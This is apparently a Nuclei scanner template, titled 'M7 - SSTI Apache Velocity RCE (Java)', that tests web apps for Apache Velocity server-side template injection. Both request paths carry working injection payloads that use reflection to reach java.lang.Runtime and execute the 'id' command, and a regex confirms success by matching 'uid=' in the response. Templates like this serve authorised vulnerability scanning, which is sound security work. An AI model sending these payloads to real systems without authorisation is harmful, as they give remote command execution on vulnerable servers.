id: m7-ssti-velocity
info:
  name: M7 - SSTI Apache Velocity RCE (Java)
  author: Sharlix
  severity: critical
  description: Apache Velocity SSTI RCE on Java web applications
  tags: ssti,velocity,java,rce,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?name=#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex"
      - "{{BaseURL}}?q=#set($s="")#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))#set($process=$runtime.exec("id"))"

    matchers:
      - type: regex
        regex:
          - "uid=\d+\(.*?\)"
        part: body
